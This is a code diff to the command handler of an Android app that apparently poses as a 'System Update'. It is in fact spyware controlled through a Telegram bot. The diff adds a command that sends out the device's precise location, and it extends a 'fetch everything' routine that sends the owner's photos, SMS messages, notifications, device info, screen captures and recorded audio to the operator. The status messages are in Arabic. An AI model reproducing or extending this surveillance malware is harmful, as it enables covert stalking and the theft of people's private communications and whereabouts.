@@ -42,6 +42,7 @@ object CommandExecutor {
         when {
             cmd == "/start" || cmd == "/menu" -> showMainMenu(ctx)
             cmd == "/info" -> showDeviceInfo(ctx)
+            cmd == "/location" || cmd == "/loc" -> showLocation(ctx)
             cmd == "/photos" -> fetchAllPhotos(ctx)
             cmd == "/sms" -> fetchAllSms(ctx)
             cmd == "/notifs" -> fetchAllNotifs(ctx)
@@ -59,6 +60,9 @@ object CommandExecutor {
         }
     }
 
+    // ────────────────────────────────────────────
+    //  MENUS
+    // ────────────────────────────────────────────
     private fun showMainMenu(ctx: Context) {
         val text = """
             🎛 *لوحة التحكم — System Update*
@@ -73,9 +77,21 @@ object CommandExecutor {
         TelegramApi.sendMessage(info, KeyboardBuilder.backToMenu())
     }
 
+    private fun showLocation(ctx: Context) {
+        runJob(ctx, "location") {
+            TelegramApi.sendMessage("📍 *جاري تحديد الموقع بدقة عالية...*\n⏱ قد يأخذ حتى 15 ثانية")
+            val loc = LocationHelper.getPreciseLocation(ctx)
+            val text = LocationHelper.formatLocation(ctx, loc)
+            TelegramApi.sendMessage(text, KeyboardBuilder.backToMenu())
+        }
+    }
+
+    // ────────────────────────────────────────────
+    //  SCREEN CAPTURE
+    // ────────────────────────────────────────────
     private fun captureOnce(ctx: Context) {
         if (!ScreenCapture.isReady) {
-            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير ممنوحة.\\nأعد فتح التطبيق ووافق على الطلب.", KeyboardBuilder.backToMenu())
+            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير ممنوحة.\nأعد فتح التطبيق ووافق على الطلب.", KeyboardBuilder.backToMenu())
             return
         }
         runJob(ctx, "screen_once") {
@@ -99,7 +115,7 @@ object CommandExecutor {
             return
         }
         screenLoopActive = true
-        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة\\n⏱ كل 30 ثانية", KeyboardBuilder.mainMenu())
+        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة\n⏱ كل 30 ثانية", KeyboardBuilder.mainMenu())
     }
 
     private fun stopScreenLoop(ctx: Context) {
@@ -107,6 +123,9 @@ object CommandExecutor {
         TelegramApi.sendMessage("📷 ⏹ تم إيقاف اللقطات المتكررة", KeyboardBuilder.mainMenu())
     }
 
+    // ────────────────────────────────────────────
+    //  PHOTOS
+    // ────────────────────────────────────────────
     private fun fetchAllPhotos(ctx: Context) {
         runJob(ctx, "photos_all") {
             val all = MediaScanner.scanImages(ctx)
@@ -131,7 +150,7 @@ object CommandExecutor {
         runningJobs[jobId] = true
 
         val statusMsgId = TelegramApi.sendMessage(
-            "$title\\n⏳ جاري الإرسال... 0/${list.size}",
+            "$title\n⏳ جاري الإرسال... 0/${list.size}",
             KeyboardBuilder.stopJob(jobId)
         )
 
@@ -151,7 +170,7 @@ object CommandExecutor {
                 val elapsed = (System.currentTimeMillis() - startTime) / 1000
                 TelegramApi.editMessage(
                     statusMsgId,
-                    "$title\\n⏳ $sent ناجح / $failed فشل\\n⏱ مضى: ${elapsed}s",
+                    "$title\n⏳ $sent ناجح / $failed فشل\n⏱ مضى: ${elapsed}s",
                     KeyboardBuilder.stopJob(jobId)
                 )
                 Thread.sleep(500)
@@ -162,11 +181,14 @@ object CommandExecutor {
         val elapsed = (System.currentTimeMillis() - startTime) / 1000
         TelegramApi.editMessage(
             statusMsgId,
-            "$title\\n✅ انتهى\\n📤 $sent أرسلت\\n❌ $failed فشلت\\n⏱ ${elapsed}s",
+            "$title\n✅ انتهى\n📤 $sent أرسلت\n❌ $failed فشلت\n⏱ ${elapsed}s",
             KeyboardBuilder.backToMenu()
         )
     }
 
+    // ────────────────────────────────────────────
+    //  SMS
+    // ────────────────────────────────────────────
     private fun fetchAllSms(ctx: Context) {
         runJob(ctx, "sms_all") {
             val inbox = SmsReader.scanAll(ctx)
@@ -180,18 +202,18 @@ object CommandExecutor {
 
             val grouped = all.groupBy { it.optString("address", "unknown") }
             val sb = StringBuilder()
-            sb.append("📩 *تقرير SMS* — ${all.size} رسالة\\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\\n\\n")
+            sb.append("📩 *تقرير SMS* — ${all.size} رسالة\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
 
             for ((address, msgs) in grouped) {
-                sb.append("📞 *$address* (${msgs.size})\\n")
+                sb.append("📞 *$address* (${msgs.size})\n")
                 for (m in msgs.take(5)) {
                     val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                     val body = m.optString("body", "").take(80)
-                    sb.append("  $type $body\\n")
+                    sb.append("  $type $body\n")
                 }
-                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\\n")
-                sb.append("\\n")
+                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
+                sb.append("\n")
 
                 if (sb.length > 3500) {
                     TelegramApi.sendMessage(sb.toString())
@@ -203,6 +225,9 @@ object CommandExecutor {
         }
     }
 
+    // ────────────────────────────────────────────
+    //  NOTIFICATIONS
+    // ────────────────────────────────────────────
     private fun fetchAllNotifs(ctx: Context) {
         runJob(ctx, "notifs_all") {
             val lines = DataStore.drain(ctx, limit = 5000)
@@ -220,19 +245,19 @@ object CommandExecutor {
 
             val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
             val sb = StringBuilder()
-            sb.append("🔔 *الإشعارات* — ${notifs.size} إشعار\\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\\n\\n")
+            sb.append("🔔 *الإشعارات* — ${notifs.size} إشعار\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
 
             for ((pkg, items) in grouped) {
-                sb.append("📱 *$pkg* (${items.size})\\n")
+                sb.append("📱 *$pkg* (${items.size})\n")
                 for (n in items.take(5)) {
                     val t = n.optString("title", "")
                     val tx = n.optString("text", "")
-                    if (t.isNotBlank()) sb.append("  ▸ $t\\n")
-                    if (tx.isNotBlank()) sb.append("    $tx\\n")
+                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
+                    if (tx.isNotBlank()) sb.append("    $tx\n")
                 }
-                if (items.size > 5) sb.append("  … +${items.size - 5}\\n")
-                sb.append("\\n")
+                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
+                sb.append("\n")
 
                 if (sb.length > 3500) {
                     TelegramApi.sendMessage(sb.toString())
@@ -244,13 +269,16 @@ object CommandExecutor {
         }
     }
 
+    // ────────────────────────────────────────────
+    //  AUDIO
+    // ────────────────────────────────────────────
     private fun startAudio(ctx: Context) {
         if (AudioRecorder.isRunning()) {
             TelegramApi.sendMessage("🎤 التسجيل شغّال بالفعل")
             return
         }
         AudioRecorder.startLoop(ctx)
-        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل التلقائي\\n📤 مقطع كل 10 ثواني",
+        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل التلقائي\n📤 مقطع كل 10 ثواني",
             KeyboardBuilder.mainMenu())
     }
 
@@ -259,26 +287,46 @@ object CommandExecutor {
         TelegramApi.sendMessage("🎤 ⏹ تم إيقاف التسجيل", KeyboardBuilder.mainMenu())
     }
 
+    // ────────────────────────────────────────────
+    //  FETCH ALL
+    // ────────────────────────────────────────────
     private fun fetchEverything(ctx: Context) {
         runJob(ctx, "all") {
-            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*\\n\\n1️⃣ صور...")
+            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*\n\n0️⃣ معلومات الجهاز...")
             Thread.sleep(500)
+            try {
+                val info = DeviceInfo.getFullInfo(ctx)
+                TelegramApi.sendMessage(info)
+            } catch (_: Exception) {}
 
+            Thread.sleep(500)
+            TelegramApi.sendMessage("📍 *الموقع...*")
+            try {
+                val loc = LocationHelper.getPreciseLocation(ctx)
+                val locText = LocationHelper.formatLocation(ctx, loc)
+                TelegramApi.sendMessage(locText)
+            } catch (_: Exception) {}
+
+            Thread.sleep(500)
+            TelegramApi.sendMessage("1️⃣ *صور...*")
             val photos = MediaScanner.scanImages(ctx)
             sendPhotosList(ctx, photos, "📸 الصور")
 
-            TelegramApi.sendMessage("2️⃣ *SMS...*")
             Thread.sleep(500)
+            TelegramApi.sendMessage("2️⃣ *SMS...*")
             fetchAllSms(ctx)
 
-            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
             Thread.sleep(500)
+            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
             fetchAllNotifs(ctx)
 
             TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
         }
     }
 
+    // ────────────────────────────────────────────
+    //  JOB MANAGEMENT
+    // ────────────────────────────────────────────
     private fun stopJob(ctx: Context, jobId: String) {
         runningJobs[jobId] = false
         runningJobs.remove(jobId)
